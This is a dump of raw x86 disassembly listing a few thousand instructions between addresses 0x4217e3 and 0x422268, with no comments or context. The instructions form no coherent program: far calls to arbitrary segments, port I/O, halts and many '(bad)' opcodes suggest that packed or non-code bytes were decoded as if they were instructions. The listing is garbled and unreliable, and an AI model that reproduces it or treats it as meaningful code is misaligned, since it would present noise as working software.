  4217e3:	add    eax,0xd860d45f
  4217e8:	sub    bh,bh
  4217ea:	daa    
  4217eb:	call   0x5d9:0x1bc6dc47
  4217f2:	mov    ah,0xdd
  4217f4:	fistp  DWORD PTR [eax]
  4217f6:	ja     0x42179c
  4217f8:	pushf  
  4217f9:	push   ecx
  4217fa:	push   esp
  4217fb:	fs mov al,0x23
  4217fe:	push   cs
  4217ff:	xor    eax,0xec692491
  421804:	cmp    al,0x4f
  421806:	and    eax,0xff68ff79
  42180b:	xor    ch,bh
  42180d:	inc    edx
  42180e:	pop    ds
  42180f:	ins    BYTE PTR es:[edi],dx
  421810:	cmp    eax,DWORD PTR [esi*2-0x5e39e274]
  421817:	call   0x839d:0x7e402691
  42181e:	pop    es
  42181f:	es loope 0x421830
  421822:	jbe    0x421800
  421824:	sbb    ebx,eax
  421826:	jb     0x4217c2
  421828:	add    edi,ebx
  42182a:	add    ah,BYTE PTR [eax+0x63bcd635]
  421830:	call   0x4634:0x74b9fc5f
  421837:	icebp  
  421838:	mov    cl,0x44
  42183a:	neg    esp
  42183c:	xor    eax,0xc1e8f380
  421841:	mov    esp,0xb52fba41
  421846:	push   ecx
  421847:	ss dec edi
  421849:	xor    esp,edi
  42184b:	cmp    bl,0x72
  42184e:	cld    
  42184f:	and    BYTE PTR [edx],bl
  421851:	dec    esp
  421852:	push   esi
  421853:	pop    edx
  421854:	call   0x872b72de
  421859:	mov    esi,0xa61af025
  42185e:	hlt    
  42185f:	iret   
  421860:	aaa    
  421861:	dec    ebp
  421862:	push   ss
  421863:	pop    ds
  421864:	hlt    
  421865:	jl     0x421892
  421867:	and    al,0x1d
  421869:	mov    ecx,0xed4e83df
	...
  4218d6:	shl    DWORD PTR [eax-0x6061f47],1
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	inc    ecx
  4218e3:	cmc    
  4218e4:	cmp    ah,BYTE PTR [edx+0x67]
  4218e7:	push   0x1000001
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	cdq    
  4218ef:	hlt    
  4218f0:	xchg   ebx,eax
  4218f1:	int    0xba
  4218f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218f4:	stos   BYTE PTR es:[edi],al
  4218f5:	cs push esp
  4218f7:	cli    
  4218f8:	out    dx,eax
  4218f9:	in     eax,dx
  4218fa:	sub    al,0x8c
  4218fc:	lea    ebp,[ecx+0x67]
  4218ff:	inc    eax
  421900:	std    
  421901:	mov    dl,0x37
  421903:	mov    ds:0xd64eafce,eax
  421908:	pop    bx
  42190a:	loop   0x421984
  42190c:	inc    esi
  42190d:	sub    al,0x5a
  42190f:	and    BYTE PTR [ebx-0x6a93d9c3],cl
  421915:	push   ebp
  421916:	and    eax,0x451b9899
  42191b:	mov    eax,0x2840b85
  421920:	fwait
  421921:	mov    eax,ebx
  421923:	stc    
  421924:	xchg   esp,eax
  421925:	or     ecx,ebx
  421927:	xchg   esi,eax
  421928:	retf   
  421929:	(bad)  
  42192a:	push   0xb0b1b9c7
  42192f:	or     BYTE PTR [ebp-0x6395d075],dl
  421935:	into   
  421936:	loope  0x4218fe
  421938:	and    edx,edi
  42193a:	jp     0x42197f
  42193c:	xchg   ecx,eax
  42193d:	scas   al,BYTE PTR es:[edi]
  42193e:	mov    bl,0xd
  421940:	push   esp
  421941:	mov    ebp,DWORD PTR [edi-0x57]
  421944:	sbb    dh,bl
  421946:	(bad)  
  421947:	out    dx,eax
  421948:	ficomp DWORD PTR [ebx+0x7b005972]
  42194e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42194f:	je     0x421939
  421951:	imul   esi,DWORD PTR [esi+0x1ea7ebc6],0xd37256f1
  42195b:	retf   
  42195c:	jge    0x4219cf
  42195e:	push   eax
  42195f:	test   ecx,edi
  421961:	imul   edi,DWORD PTR [edx],0x4aa92ed7
  421967:	sbb    bh,cl
  421969:	mov    cl,0xca
  42196b:	add    esi,edx
  42196d:	or     edi,DWORD PTR [ebx+0x3a2fa2d1]
  421973:	push   esp
  421974:	push   ss
  421975:	inc    esi
  421976:	sbb    eax,0x212ffec0
  42197b:	adc    eax,DWORD PTR [eax+edi*4+0x2]
  42197f:	sub    bl,BYTE PTR [ebp+0x686a0526]
  421985:	or     cl,bh
  421987:	inc    eax
  421988:	xor    edi,DWORD PTR [eax+0x46330c43]
  42198e:	test   ebx,esi
  421990:	pop    ds
  421991:	xor    dh,al
  421993:	fcomip st,st(7)
  421995:	in     al,dx
  421996:	clc    
  421997:	stos   DWORD PTR es:[edi],eax
  421998:	(bad)  
  421999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42199a:	push   edi
  42199b:	xor    esi,edi
  42199d:	lods   al,BYTE PTR ds:[esi]
  42199e:	sbb    al,0xd7
  4219a0:	xor    esi,DWORD PTR [edx+eiz*4]
  4219a3:	sbb    DWORD PTR [ecx-0x6f],ecx
  4219a6:	sub    BYTE PTR [edi],bl
  4219a8:	inc    ecx
  4219a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219aa:	mov    dh,0x14
  4219ac:	daa    
  4219ad:	add    BYTE PTR [ebx+eiz*4],bl
  4219b0:	mov    ds:0x6205b29f,al
  4219b5:	fstp   DWORD PTR [ebp+0x24]
  4219b8:	imul   esp,DWORD PTR [ebx+0x49d52f0d],0xffffffc0
  4219bf:	sub    eax,0x1ab868b3
  4219c4:	push   edx
  4219c5:	mov    ds:0x55e32e8,eax
  4219ca:	call   0x387f:0x522894d3
  4219d1:	jne    0x421a3e
  4219d3:	push   0x83e15dcd
  4219d8:	or     al,BYTE PTR [esi-0x7b46bce2]
  4219de:	aaa    
  4219df:	dec    ebp
  4219e0:	cli    
  4219e1:	stc    
  4219e2:	inc    ecx
  4219e3:	inc    bh
  4219e5:	dec    edi
  4219e6:	es jmp 0xc42f2603
  4219ec:	xchg   esi,eax
  4219ed:	push   ebx
	...
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	pop    eax
  421a63:	popf   
  421a64:	outs   dx,DWORD PTR ds:[esi]
  421a65:	jne    0x421ace
  421a67:	imul   eax,DWORD PTR [ecx],0x10000
  421a6d:	add    cl,ah
  421a6f:	out    dx,eax
  421a70:	mov    bh,0x34
  421a72:	xor    eax,0x903cb840
  421a77:	test   DWORD PTR [ecx+0x2b39baf2],eax
  421a7d:	push   edx
  421a7e:	loop   0x421ae3
  421a80:	pop    es
  421a81:	and    eax,0xfaed6044
  421a86:	out    0xab,al
  421a88:	mov    eax,ds:0x9a66d9a2
  421a8d:	xchg   DWORD PTR [eax+ebp*8-0x15],edx
  421a91:	dec    edx
  421a92:	push   ebx
  421a93:	fiadd  DWORD PTR [edx]
  421a95:	cdq    
  421a96:	sub    eax,edx
  421a98:	(bad)  
  421a99:	ficomp DWORD PTR [ecx]
  421a9b:	mov    BYTE PTR [ebx+edx*8-0x46],bl
  421a9f:	daa    
  421aa0:	mov    al,0x1d
  421aa2:	int3   
  421aa3:	div    ebp
  421aa5:	iret   
  421aa6:	mul    BYTE PTR [ebp+edx*1-0x2d50e163]
  421aad:	shl    DWORD PTR [eax+0x41],cl
  421ab0:	sbb    al,0x21
  421ab2:	pop    ebx
  421ab3:	or     BYTE PTR [edi],0x64
  421ab6:	bound  esi,QWORD PTR [ebx+0x43752d7f]
  421abc:	cld    
  421abd:	ret    
  421abe:	dec    eax
  421abf:	jg     0x421a72
  421ac1:	cs nop
  421ac3:	out    0x58,eax
  421ac5:	ins    BYTE PTR es:[edi],dx
  421ac6:	xlat   BYTE PTR ds:[ebx]
  421ac7:	xchg   edx,eax
  421ac8:	ret    0xa3fb
  421acb:	(bad)  [eax-0x3baa68d9]
  421ad1:	mov    ch,0x8b
  421ad3:	sub    dh,BYTE PTR [ecx-0x6c]
  421ad6:	sbb    ah,BYTE PTR [ebp+0x627ff01d]
  421adc:	pop    ebp
  421add:	lock popf 
  421adf:	loopne 0x421b08
  421ae1:	lds    ebp,FWORD PTR [edx]
  421ae3:	xchg   edi,eax
  421ae4:	sub    al,0x12
  421ae6:	mov    bl,al
  421ae8:	loopne 0x421aae
  421aea:	call   0x5e22:0xdc5bb94e
  421af1:	cmc    
  421af2:	or     DWORD PTR [esi+0x7a],0xa795a341
  421af9:	pop    DWORD PTR [edx+0x1f]
  421afc:	and    BYTE PTR [edi],0x3b
  421aff:	inc    eax
  421b00:	cdq    
  421b01:	mov    bl,0xa6
  421b03:	les    eax,FWORD PTR [ecx-0x2e4c82fa]
  421b09:	adc    eax,0x59cc1771
  421b0e:	lahf   
  421b0f:	xor    dh,BYTE PTR [edx+0x67]
  421b12:	xchg   ecx,eax
  421b13:	in     al,dx
  421b14:	out    dx,al
  421b15:	mov    edx,0x39334c18
  421b1a:	(bad)  
  421b1b:	adc    cl,al
  421b1d:	test   al,0xe1
  421b1f:	lahf   
  421b20:	sahf   
  421b21:	jo     0x421b5d
  421b23:	cmp    eax,DWORD PTR [edx-0x4d]
  421b26:	or     eax,0x1a3b3d92
  421b2b:	int3   
  421b2c:	mov    ds:0xe782825f,al
  421b31:	mov    ds:0xc231e516,al
  421b36:	mov    dh,0x4c
  421b38:	jl     0x421b13
  421b3a:	mov    esi,0xe7c24134
  421b3f:	loop   0x421bb9
  421b41:	inc    esi
  421b42:	int3   
  421b43:	fld    DWORD PTR [edx+0x29408f78]
  421b49:	or     eax,0xb63ba2e9
  421b4e:	add    BYTE PTR [ecx+0x51],0x8
  421b52:	push   ecx
  421b53:	les    esi,FWORD PTR [ecx+0x6f]
  421b56:	add    DWORD PTR [edx-0x2e],edx
  421b59:	fstp   DWORD PTR ds:0x16e9810a
  421b5f:	push   ebx
  421b60:	sbb    BYTE PTR [edi],dh
  421b62:	mov    dh,0x94
  421b64:	aam    0xdd
  421b66:	mov    eax,0x7efd36f8
  421b6b:	je     0x421afb
  421b6d:	add    al,BYTE PTR [eax]
	...
  421bd3:	add    BYTE PTR [eax],al
  421bd5:	add    BYTE PTR [esi],dl
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     ah,BYTE PTR [eax+0x67ac1fd6]
  421be7:	push   0x1
  421be9:	add    BYTE PTR [eax],al
  421beb:	add    DWORD PTR [eax],eax
  421bed:	add    BYTE PTR [ecx+0x46],dh
  421bf0:	adc    eax,0x5bc1da65
  421bf5:	(bad)
  421bf8:	popa   
  421bf9:	sti    
  421bfa:	enter  0x37f,0x4e
  421bfe:	call   0xebdc:0x4f9f4b03
  421c05:	rcl    DWORD PTR [edi],1
  421c07:	jg     0x421bd4
  421c09:	or     eax,0x749d7f6f
  421c0e:	es dec edx
  421c10:	and    dl,BYTE PTR [edi+0x18]
  421c13:	retf   
  421c14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c15:	mov    eax,0x80f7e8e8
  421c1a:	and    al,0xc5
  421c1c:	or     al,0xa1
  421c1e:	imul   eax,ecx,0x4e
  421c21:	sar    DWORD PTR [ebp-0x8],1
  421c24:	daa    
  421c25:	lds    ebp,FWORD PTR [eax+0x75]
  421c28:	sbb    eax,0xa4d16a89
  421c2d:	push   esi
  421c2e:	sub    ecx,DWORD PTR ss:[esp+ecx*2-0x37c411ed]
  421c36:	outs   dx,BYTE PTR ds:[esi]
  421c37:	adc    bl,BYTE PTR [eax+esi*8-0x14976a65]
  421c3e:	fwait
  421c3f:	aam    0x72
  421c41:	and    eax,0x4c5e9e9d
  421c46:	cmc    
  421c47:	arpl   WORD PTR [eax+0x4b],bx
  421c4a:	hlt    
  421c4b:	mov    ebx,0x6cc764ce
  421c50:	stos   BYTE PTR es:[edi],al
  421c51:	into   
  421c52:	rcl    DWORD PTR [ebx+0x274d3599],cl
  421c58:	fld    TBYTE PTR [edi+0x6201bbc5]
  421c5e:	add    BYTE PTR [esi+ecx*2-0x35],bl
  421c62:	cdq    
  421c63:	adc    edx,ecx
  421c65:	ret    0xe189
  421c68:	cmp    al,0x7c
  421c6a:	sub    BYTE PTR [ecx],dl
  421c6c:	test   DWORD PTR [edi+0x4aef3b67],eax
  421c72:	and    cl,BYTE PTR [edi+0x666a9d26]
  421c78:	fcom   DWORD PTR [ebx+ebp*1]
  421c7b:	sbb    eax,0x49a09bc6
  421c80:	dec    ecx
  421c81:	pop    ss
  421c82:	xchg   edi,eax
  421c83:	push   edx
  421c84:	ds inc ebp
  421c86:	retf   0xe417
  421c89:	inc    ebx
  421c8a:	push   edi
  421c8b:	leave  
  421c8c:	sub    al,0x81
  421c8e:	sbb    BYTE PTR [ebx+0x1edff75b],dh
  421c94:	leave  
  421c95:	sbb    al,0xfa
  421c97:	clc    
  421c98:	mov    bl,ah
  421c9a:	pop    edi
  421c9b:	(bad)  
  421c9c:	(bad)  
  421c9e:	mov    edx,0x4e97be41
  421ca3:	(bad)  
  421ca5:	loop   0x421cdd
  421ca7:	push   esp
  421ca8:	test   eax,0x7e51daec
  421cad:	cli    
  421cae:	fimul  DWORD PTR [edx+0x35]
  421cb1:	or     al,0xd6
  421cb3:	inc    esi
  421cb4:	pop    eax
  421cb5:	and    eax,0xd6b80825
  421cba:	ret    0x37c8
  421cbd:	pop    ds
  421cbe:	outs   dx,BYTE PTR ds:[esi]
  421cbf:	(bad)  
  421cc0:	stc    
  421cc1:	test   al,0x35
  421cc3:	arpl   WORD PTR [eax-0x7c],cx
  421cc6:	iret   
  421cc7:	adc    dh,BYTE PTR [ebp+0x1]
  421cca:	xchg   esp,eax
  421ccb:	mov    cl,0xfb
  421ccd:	or     ebx,DWORD PTR [ecx]
  421ccf:	inc    eax
  421cd0:	add    al,0xc8
  421cd2:	and    BYTE PTR [ecx],dh
  421cd4:	mov    bl,0x1
  421cd6:	dec    edx
  421cd7:	jno    0x421ca1
  421cd9:	ror    DWORD PTR [ecx-0x58],1
  421cdc:	adc    al,0xcf
  421cde:	ret    0xbff7
  421ce1:	push   esp
  421ce2:	or     edi,edx
  421ce4:	fs xchg ebx,eax
  421ce6:	das    
  421ce7:	mov    eax,ds:0xabf9615d
  421cec:	mov    ebp,0x5d
	...
  421d55:	add    BYTE PTR [eax-0x1a4a95],dh
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	or     eax,0x6797f909
  421d67:	imul   eax,DWORD PTR [ecx],0x0
  421d6a:	add    BYTE PTR [ecx],al
  421d6c:	add    BYTE PTR [eax],al
  421d6e:	mov    ecx,0x5aae15c1
  421d73:	mov    bl,0xe7
  421d75:	rcl    DWORD PTR [esi],cl
  421d77:	cmp    BYTE PTR [esp+0x55d45252],dh
  421d7e:	out    0x6b,eax
  421d80:	bound  ebx,QWORD PTR [ebp-0x65]
  421d83:	jmp    0x421d2f
  421d85:	loopne 0x421d4b
  421d87:	(bad)  
  421d88:	es adc al,0x1b
  421d8b:	and    eax,0xfad8c2cd
  421d90:	nop
  421d91:	cli    
  421d92:	pop    es
  421d93:	cld    
  421d94:	lods   eax,DWORD PTR ds:[esi]
  421d95:	push   ss
  421d96:	jnp    0x421d9b
  421d98:	popf   
  421d99:	(bad)  
  421d9a:	fcomp  DWORD PTR [eax-0x5aefa3b3]
  421da0:	pop    edx
  421da1:	jmp    0x539526e7
  421da6:	jne    0x421e02
  421da8:	jmp    0x714e0ad7
  421dad:	push   0xffffffd8
  421daf:	je     0x421ded
  421db1:	je     0x421d78
  421db3:	dec    esp
  421db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421db5:	ins    BYTE PTR es:[edi],dx
  421db6:	cmp    cl,BYTE PTR [ebp-0xd]
  421db9:	or     al,0x2e
  421dbc:	dec    esp
  421dbd:	xchg   ebp,eax
  421dbe:	dec    BYTE PTR [edi+ebp*8]
  421dc1:	gs push edx
  421dc3:	push   esi
  421dc4:	mov    ch,0xec
  421dc6:	push   ss
  421dc7:	xor    BYTE PTR [esi+0x8],al
  421dca:	mov    eax,ds:0x754477c6
  421dcf:	sub    BYTE PTR [esi+ebp*1],dh
  421dd2:	push   esp
  421dd3:	loope  0x421e3a
  421dd5:	mov    ch,0xe
  421dd7:	xchg   ecx,eax
  421dd8:	mov    ch,0x8c
  421dda:	test   DWORD PTR cs:[esp+eax*1+0x3ad027e2],edx
  421de2:	jge    0x421e31
  421de4:	pop    ebx
  421de5:	mov    ds:0x6d1e92c6,al
  421dea:	jge    0x421e0d
  421dec:	push   ecx
  421ded:	sub    BYTE PTR [eax+0x4a],al
  421df0:	mov    eax,ds:0x7839156
  421df5:	ins    BYTE PTR es:[edi],dx
  421df6:	and    ecx,DWORD PTR [edx]
  421df8:	(bad)  
  421df9:	xchg   edi,eax
  421dfa:	leave  
  421dfb:	pop    ds
  421dfc:	or     bh,BYTE PTR [ecx+eax*8-0x56ed358f]
  421e03:	mov    WORD PTR ds:0xd5a31bf3,ss
  421e09:	es pushf 
  421e0b:	push   eax
  421e0c:	ins    DWORD PTR es:[edi],dx
  421e0d:	pop    ss
  421e0e:	mov    esp,0x639bd696
  421e13:	sti    
  421e14:	dec    edi
  421e15:	cmp    eax,0xd2dc61e7
  421e1a:	ror    DWORD PTR [ecx-0x3959d8df],1
  421e20:	fstp   QWORD PTR [esi+0x3fbcc6d8]
  421e26:	adc    eax,0x9ffd4707
  421e2b:	pop    esp
  421e2c:	push   esp
  421e2d:	inc    edi
  421e2e:	sti    
  421e2f:	xor    eax,0xf4415394
  421e34:	enter  0x9192,0x5
  421e38:	imul   eax,DWORD PTR [ecx+0x76],0x75e89407
  421e3f:	or     al,0xb7
  421e41:	dec    esi
  421e42:	mov    ah,dl
  421e44:	hlt    
  421e45:	add    al,0xa8
  421e47:	sbb    bl,bl
  421e49:	dec    esp
  421e4a:	addr16 test al,0x29
  421e4d:	xor    bh,bh
  421e4f:	pop    ebp
  421e50:	sbb    ecx,DWORD PTR [ecx]
  421e52:	xor    bh,ch
  421e54:	test   eax,0x8ba1a10e
  421e59:	daa    
  421e5a:	and    dh,cl
  421e5c:	push   cs
  421e5d:	inc    edi
  421e5e:	sbb    esp,eax
  421e60:	xchg   BYTE PTR [edi+0x14],al
  421e63:	imul   ecx,DWORD PTR [edx-0x7f],0x432462c8
  421e6a:	push   edx
  421e6b:	ds push eax
  421e6d:	push   ebx
	...
  421ed6:	iret   
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	data16 loopne 0x421f23
  421ee5:	mov    bh,0x67
  421ee7:	ins    BYTE PTR es:[edi],dx
  421ee8:	add    DWORD PTR [eax],eax
  421eea:	add    BYTE PTR [ecx],al
  421eec:	add    BYTE PTR [eax],al
  421eee:	or     DWORD PTR [eax+0x1406ef66],esi
  421ef4:	push   cs
  421ef5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ef6:	les    ebx,FWORD PTR ds:0x47b4ffc2
  421efc:	outs   dx,DWORD PTR ds:[esi]
  421efd:	jmp    FWORD PTR [edx+0x42]
  421f00:	adc    al,0xd9
  421f02:	ss das 
  421f04:	pop    ecx
  421f05:	int    0x95
  421f07:	mov    DWORD PTR [edi],eax
  421f09:	push   0xffffffb2
  421f0b:	jns    0x421ee4
  421f0d:	cwde   
  421f0e:	lea    ecx,[ecx]
  421f10:	xchg   BYTE PTR [edx],cl
  421f12:	jmp    0x4c104c85
  421f17:	push   eax
  421f18:	jge    0x421f13
  421f1a:	iret   
  421f1b:	jmp    0x7dd13bbf
  421f20:	push   0x6f
  421f22:	test   eax,0xd51bf0d3
  421f27:	hlt    
  421f28:	jmp    0xecfe61b2
  421f2d:	dec    edi
  421f2e:	dec    esi
  421f2f:	stc    
  421f30:	cld    
  421f31:	mov    esi,DWORD PTR [eax+0x2e]
  421f34:	enter  0x9d12,0xa2
  421f38:	mov    BYTE PTR [esi+edx*8-0x36],bh
  421f3c:	ror    DWORD PTR [ecx],cl
  421f3e:	inc    esi
  421f3f:	mov    esi,DWORD PTR [ecx+0x2ebc35a2]
  421f45:	jb     0x421fb4
  421f47:	xchg   esi,eax
  421f48:	test   BYTE PTR [eax-0x17],bl
  421f4b:	retf   
  421f4c:	jmp    0x8ea5:0x178e590e
  421f53:	mov    dh,0x9b
  421f55:	int    0x50
  421f57:	mov    ch,0x47
  421f59:	int    0xbc
  421f5b:	scas   eax,DWORD PTR es:[edi]
  421f5c:	sti    
  421f5d:	(bad)  
  421f5e:	adc    DWORD PTR [eax+0x324ef46b],ebx
  421f64:	enter  0xef9e,0x9b
  421f68:	aam    0x21
  421f6a:	pop    ebp
  421f6b:	shl    ecx,0x90
  421f6e:	adc    bh,BYTE PTR [ebp+0x13]
  421f71:	mov    ?,WORD PTR [edi+ecx*8-0x56]
  421f75:	or     al,0xbf
  421f77:	bound  esi,QWORD PTR [ebp+edi*2+0x27]
  421f7b:	(bad)  
  421f7c:	xor    eax,0x54d79038
  421f81:	fsubr  DWORD PTR [ecx+eax*1]
  421f84:	leave  
  421f85:	test   DWORD PTR [ebx+0x6258415e],ecx
  421f8b:	dec    ebp
  421f8c:	leave  
  421f8d:	and    eax,0x43826c1e
  421f92:	dec    ebx
  421f93:	mov    eax,ds:0x575a5567
  421f98:	jp     0x421f2e
  421f9a:	out    dx,al
  421f9b:	ins    DWORD PTR es:[edi],dx
  421f9c:	sub    eax,DWORD PTR [ecx-0x33328ef9]
  421fa2:	clc    
  421fa3:	xor    dl,BYTE PTR [ecx-0x7d1b1fb7]
  421fa9:	mov    esp,0xec3f54c8
  421fae:	mov    ?,edi
  421fb0:	pop    edx
  421fb1:	clc    
  421fb2:	(bad)  
  421fb3:	imul   ecx,edi,0x40
  421fb6:	mov    dh,0x53
  421fb8:	idiv   BYTE PTR [esp+edi*4-0x72006952]
  421fbf:	jb     0x421f5e
  421fc1:	add    BYTE PTR ds:0x1f1569e1,dl
  421fc7:	xor    eax,0x248b6472
  421fcc:	loope  0x421f6c
  421fce:	jne    0x421f89
  421fd0:	aaa    
  421fd1:	pop    esp
  421fd2:	sti    
  421fd3:	mov    eax,ds:0xe2150367
  421fd8:	cwde   
  421fd9:	cld    
  421fda:	push   edi
  421fdb:	(bad)  
  421fdc:	in     al,0x94
  421fde:	pcmpgtw mm4,QWORD PTR [edx+0x62ca3864]
  421fe5:	adc    al,0xbd
  421fe7:	sub    esi,DWORD PTR [esi+0x512ab126]
  421fed:	enter  0x0,0x0
	...
  422055:	add    BYTE PTR [ebx+0x6],ch
  422058:	(bad)  
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	in     ax,0xcb
  422064:	sub    al,BYTE PTR [edi+0x16d67]
  42206a:	add    BYTE PTR [ecx],al
  42206c:	add    BYTE PTR [eax],al
  42206e:	out    dx,eax
  42206f:	nop
  422070:	lds    eax,FWORD PTR [edx]
  422072:	ss push edx
  422074:	jne    0x4220a3
  422076:	add    al,0x3f
  422078:	outs   dx,DWORD PTR ds:[esi]
  422079:	test   al,0x99
  42207b:	xor    edi,DWORD PTR [ecx-0xc1bfdbe]
  422081:	retf   0x89e7
  422084:	add    BYTE PTR [edx],0x14
  422087:	jmp    0x42205f
  422089:	mov    ch,0xd7
  42208b:	out    0xa9,eax
  42208d:	mov    esp,0x95c0e1c9
  422092:	not    DWORD PTR [ebx+0x301099c7]
  422098:	xlat   BYTE PTR ds:[ebx]
  422099:	test   al,0xb2
  42209b:	inc    esp
  42209c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42209d:	mov    dh,0xc5
  42209f:	into   
  4220a0:	loope  0x42209c
  4220a2:	fstp   st(4)
  4220a4:	xor    BYTE PTR ds:0x4b16d5b9,dh
  4220aa:	into   
  4220ab:	fadd   QWORD PTR [ebp+0x63]
  4220ae:	hlt    
  4220af:	jl     0x4220ed
  4220b1:	sti    
  4220b2:	push   esi
  4220b3:	xchg   ebp,eax
  4220b4:	pop    ecx
  4220b5:	pop    ebp
  4220b6:	sub    BYTE PTR [edi],bh
  4220b8:	sahf   
  4220b9:	fimul  WORD PTR [edi+ebx*2-0x2c27eccd]
  4220c0:	repnz outs dx,DWORD PTR ss:[esi]
  4220c3:	sbb    eax,0x6e5bcb04
  4220c8:	pop    ss
  4220c9:	xor    DWORD PTR [edx-0x591d56a5],ebx
  4220cf:	xchg   edx,eax
  4220d0:	pop    eax
  4220d1:	inc    edx
  4220d2:	lods   eax,DWORD PTR ds:[esi]
  4220d3:	xchg   esi,eax
  4220d4:	bound  ebp,QWORD PTR [ecx]
  4220d6:	lods   eax,DWORD PTR ds:[esi]
  4220d7:	xchg   DWORD PTR [eax+0x5c],esp
  4220da:	mov    edx,0xdf89d766
  4220df:	popf   
  4220e0:	inc    eax
  4220e1:	jmp    0x42211a
  4220e3:	jne    0x42209f
  4220e5:	popa   
  4220e6:	sub    BYTE PTR [esp+ecx*4+0x54825b3d],0xcf
  4220ee:	lods   eax,DWORD PTR ds:[esi]
  4220ef:	and    edx,DWORD PTR [ecx]
  4220f1:	outs   dx,DWORD PTR ds:[esi]
  4220f2:	fisubr WORD PTR [edx-0x71287eb3]
  4220f8:	dec    esp
  4220f9:	je     0x4220b8
  4220fb:	test   DWORD PTR [edi-0x80],esi
  4220fe:	mov    esi,0x83463465
  422103:	rol    BYTE PTR [ecx],1
  422105:	mov    ah,0xfe
  422107:	cwde   
  422108:	pusha  
  422109:	sub    BYTE PTR [ebx-0x74cf9d7],0x32
  422110:	stos   DWORD PTR es:[edi],eax
  422111:	sbb    dl,ah
  422113:	push   0xffffff94
  422115:	mov    BYTE PTR [eax-0x23],cl
  422118:	cli    
  422119:	sub    BYTE PTR [ebx+ecx*8],0xe1
  42211d:	dec    eax
  42211e:	shl    eax,0xf3
  422121:	mov    al,0x3e
  422123:	push   edx
  422124:	inc    edx
  422125:	test   DWORD PTR [ecx],esi
  422127:	cmp    DWORD PTR [edx],0x2595f9e
  42212d:	jecxz  0x422115
  42212f:	(bad)  
  422130:	ins    DWORD PTR es:[edi],dx
  422131:	pop    esi
  422132:	add    esp,edi
  422134:	popa   
  422135:	xchg   edi,eax
  422136:	jg     0x4221b5
  422138:	hlt    
  422139:	adc    esi,DWORD PTR [ecx+0x31]
  42213c:	sti    
  42213d:	clc    
  42213e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42213f:	pop    ecx
  422140:	mov    ebp,0xd9809b5
  422145:	ror    BYTE PTR [ecx+eiz*2-0x1127f9ec],0xc2
  42214d:	sbb    cl,bh
  42214f:	enter  0xbd08,0x2b
  422153:	mov    ch,0x66
  422155:	daa    
  422156:	fld    TBYTE PTR [edx-0x338104ae]
  42215c:	pop    esi
  42215d:	push   esp
  42215e:	jo     0x4221a1
  422160:	lds    ebx,FWORD PTR ds:0x581b7da5
  422166:	mov    esp,DWORD PTR [edx+eax*8+0x7f]
  42216a:	sub    al,0x2f
  42216c:	int3   
  42216d:	test   al,0x0
	...
  4221d3:	add    BYTE PTR [eax],al
  4221d5:	add    BYTE PTR [esi-0x284ae],ah
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    ecx,DWORD PTR [esi+0x67a9d7f8]
  4221e7:	outs   dx,BYTE PTR ds:[esi]
  4221e8:	add    DWORD PTR [eax],eax
  4221ea:	add    BYTE PTR [ecx],al
  4221ec:	add    BYTE PTR [eax],al
  4221ee:	push   ecx
  4221ef:	mov    WORD PTR [ebx+0x2e],gs
  4221f2:	mov    bl,0xde
  4221f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221f5:	sahf   
  4221f6:	stc    
  4221f7:	je     0x42221f
  4221f9:	addr16 mov ebp,0xfd692133
  4221ff:	test   BYTE PTR [edx+0x1e],cl
  422202:	ret    0x4c1a
  422205:	lahf   
  422206:	loop   0x422277
  422208:	dec    ebp
  422209:	ss std 
  42220b:	mov    DWORD PTR [ebp+edi*4+0x5be703dd],ebx
  422212:	pusha  
  422213:	adc    BYTE PTR [edx-0x2c],ah
  422216:	ja     0x42226b
  422218:	push   ebp
  422219:	xchg   BYTE PTR [eax+0x43],bl
  42221c:	es icebp 
  42221e:	dec    eax
  42221f:	lahf   
  422220:	popa   
  422221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422222:	and    ebx,ebp
  422224:	inc    edx
  422225:	mov    dh,0xce
  422227:	push   eax
  422228:	or     al,BYTE PTR [ecx+0x7c]
  42222b:	loop   0x4222a2
  42222d:	or     eax,0xbfae518f
  422232:	(bad)  
  422233:	pop    esi
  422234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422235:	adc    dl,BYTE PTR [ebp-0x24]
  422238:	setle  BYTE PTR [esi+0x61e50a6c]
  42223f:	pop    es
  422240:	in     eax,0x43
  422242:	adc    eax,0x6d056d23
  422247:	repz aas 
  422249:	mov    cl,0xcd
  42224b:	push   esi
  42224c:	push   ss
  42224d:	mov    ds:0x61f91ef9,eax
  422252:	pop    ds
  422253:	aam    0x9d
  422255:	mov    eax,ds:0x79977177
  42225a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42225b:	mov    ecx,DWORD PTR [ebp+0x3ac8a55d]
  422261:	cmp    al,0xcd
  422263:	fwait
  422264:	jo     0x422289
  422266:	sub    ah,bl
  422268:	in     al,dx
